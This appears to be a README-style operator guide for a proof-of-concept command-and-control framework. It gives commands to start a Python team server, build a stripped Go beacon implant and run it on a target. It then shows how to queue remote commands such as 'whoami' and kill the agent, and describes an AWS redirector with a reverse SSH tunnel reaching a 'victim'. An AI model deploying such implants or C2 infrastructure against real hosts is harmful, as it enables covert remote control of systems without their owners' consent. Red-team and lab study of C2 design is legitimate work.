# Operational Usage Guide: C2 Attack Chain

**Author:** mauvehack
**Context:** Proof of Concept Validation

## **Overview**
This document outlines the standard operating procedure (SOP) for validating the `c2-architecture-poc`. It details the complete attack chain lifecycle: from infrastructure initialization and agent registration to asynchronous tasking and result ingestion.

---

## **Phase 1: Infrastructure Initialization**

The Team Server acts as the central command node. It must be active before any implants are executed.

**1. Start the Controller**
Navigate to the repository root and initialize the Python server.
```bash
# In Terminal 1 (The Server)
python3 server/c2_controller.py --port 8080
Output Verification: Ensure the log displays [*] Database initialized. and Running on http://0.0.0.0:8080.

Phase 2: Agent Deployment (Simulation)
In a controlled lab environment, compile and execute the implant on the target host.

1. Compile the Implant

Bash
cd implant/
go build -ldflags "-w -s" -o beacon_linux main.go
2. Execute the Payload

Bash
# In Terminal 2 (The Target)
./beacon_linux
Output Verification: The agent will print its assigned UUID: [*] Agent Active. ID: a1b2c3d4.... It will then enter its jittered sleep cycle.

Server-Side Verification: Terminal 1 should log: [*] New Agent Registered: a1b2c3d4... (hostname).

Phase 3: Asynchronous Tasking
The operator interacts with the Team Server using the dedicated console client.

1. Queue a Command The operator instructs the specific agent (using the UUID from Phase 2) to execute a system command.

Bash
# In Terminal 3 (The Operator)
# Syntax: python client/console.py <AGENT_UUID> <COMMAND>
python client/console.py a1b2c3d4-5e6f-7g8h-9i0j-k1l2m3n4o5p6 "whoami"
Expected Response:

Plaintext
[+] Task 1 queued successfully.
Phase 4: Execution & Result Ingestion
This phase is automated by the architecture's design. Observation is key.

1. Beacon Check-In (Automatic) Wait for the implant's next sleep cycle (approx. 5 seconds).

Terminal 2 (Implant): Wakes, sends GET request, receives task, executes whoami.

Terminal 1 (Server): Logs: [*] Sending Task 1 to Agent <UUID>.

2. Result Submission (Automatic) Immediately after execution, the implant posts the results back.

Terminal 1 (Server): Logs: [*] Received Result for Task 1 from <UUID>.

Phase 5: Termination
To close the session gracefully, queue the kill command.

Bash
python client/console.py <AGENT_UUID> "die"
The implant will receive this signal on its next check-in and terminate its process.

Appendix: Proof of Concept Gallery
The following artifacts were captured during a controlled validation of the infrastructure in an AWS/Kali Linux environment.

1. Infrastructure Deployment
Provisioning the Team Server (Redirector) on AWS EC2. Note the separation of public ingress and private management interfaces.

2. Payload Staging
The local listener initialized on the operator's console, preparing to receive the tunneled connection.

3. Tunnel Establishment
Successful creation of the Reverse SSH Tunnel, forwarding the AWS Public IP traffic to the local listener.

4. Kill Chain Validation
End-to-End connectivity confirmed: The victim (browser) connects to the AWS Redirector, and the traffic is successfully tunneled to the local C2 server.



